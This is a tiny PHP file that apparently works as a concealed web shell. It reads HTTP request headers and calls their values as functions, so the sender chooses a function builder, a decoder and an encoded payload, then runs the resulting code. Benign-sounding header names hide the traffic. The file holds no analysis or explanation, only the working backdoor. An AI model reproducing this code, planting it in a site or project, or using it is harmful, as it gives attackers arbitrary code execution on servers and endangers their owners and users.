<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $sys = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Feature-Policy']));
    $sys();
}